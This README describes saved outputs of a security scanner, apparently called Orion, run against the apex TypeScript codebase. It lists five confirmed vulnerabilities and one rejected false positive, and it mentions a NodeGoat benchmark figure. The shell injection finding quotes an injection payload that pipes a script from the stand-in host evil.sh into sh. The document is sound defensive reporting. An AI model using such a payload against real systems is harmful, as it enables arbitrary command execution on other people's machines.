# Examples — real scan evidence

These are **actual, unedited outputs from real Orion runs**, committed so they survive `git clone`.
Nothing here is hand-written or illustrative; each file is what the pipeline wrote to disk.

## `apex/` — a full scan of [`pensarai/apex`](https://github.com/pensarai/apex)

A live run against a real third-party TypeScript codebase Orion had never seen (447 `.ts` / 67
`.tsx`, resolved to the Joern `jssrc` frontend). Scan id
`69dd1f145c434646e9d435aecf42ddb74e5e28c5`, run `20260729T094502Z`.

- **Graph:** 160,814 nodes / 339,405 edges, built in ~520s (see the timing lines at the top of
  `report.log`).
- **Result:** 5 confirmed vulnerabilities, 1 correctly rejected as a false positive, 0 unresolved.

| File | What it is |
|------|------------|
| `report.log` | The full human-readable run log: per-phase build timings, the live discovery/verify event stream, and the final ranked, evidence-cited report. Start here. |
| `findings.json` | The verifier's structured verdicts from the first pass — 2 `CONFIRM`, 1 `REJECT`, 3 `ERROR`. |
| `reverify.json` | The 3 `ERROR` leads re-run with a larger turn budget, all 3 → `CONFIRM`. |

> Those first-pass `ERROR`s were a too-low default verify budget (10 turns), not real failures — the
> complex 4-file RCE needed more turns to re-derive. That default has since been raised to 25 turns /
> 600s (`orion/config.py`), so a fresh scan re-derives these on the happy path without the re-run.

### What the scan actually found (each independently verified against real source)

1. **HIGH — Shell command injection.** Tool `path`/`filePath` args spliced unescaped into
   double-quoted shell strings run by `sandbox.execute`; the traversal guard blocks `..` but not
   shell metacharacters, so `foo"; curl evil.sh|sh #` → arbitrary command execution. A sibling file
   escapes correctly, proving it's an oversight. (`createFile.ts`, `deleteFile.ts`, `applyPatch.ts`,
   `updateFile.ts`)
2. **MED — SMTP TLS validation disabled (MITM).** `rejectUnauthorized: false` whenever TLS is on.
3. **MED — Insecure OAuth token store.** Access/refresh tokens written with no file mode / no
   encryption, while a sibling uses `mode: 0o600`.
4. **LOW — Missing OAuth `state`** (CSRF / auth-code injection) in localhost callback helpers.
5. **LOW — ReDoS** in a nested-quantifier regex on attacker-influenced input; the verifier
   independently reproduced the pathological backtracking.

**The rejected finding is the point.** A second ReDoS claim was *rejected* by the verifier, which
proved it was two *sequential* quantifiers (O(n²), not exponential) and that the attacker-control
path was contradicted by the code's own comments. The same verifier confirmed the structurally
similar ReDoS in #5 — it discriminates, it doesn't rubber-stamp.

> The raw per-event timeline (`progress.jsonl`) and the `scan.stderr.log` for this run are committed
> in full on the `apex-testing` branch under `bench/runs/` and `.orion/runs/`.

## NodeGoat (OWASP benchmark) — reproducible, not yet captured here

The README's headline result is **14 of 15 vulnerabilities at zero false positives** on OWASP
NodeGoat. That figure is produced by `scripts/run_nodegoat_eval.py`, scored against the ground truth
in `tests/ground_truth_nodegoat.py` — but a saved copy of that eval's output is **not** committed
yet (running it needs the NodeGoat fixture with a prebuilt `cpg.bin`, a running Neo4j, and Claude
tokens). To regenerate and capture it:

```bash
./.venv/bin/python scripts/run_nodegoat_eval.py | tee examples/nodegoat/eval.log
```

Until that run is captured, the **apex** evidence above is the end-to-end proof that survives a clone.
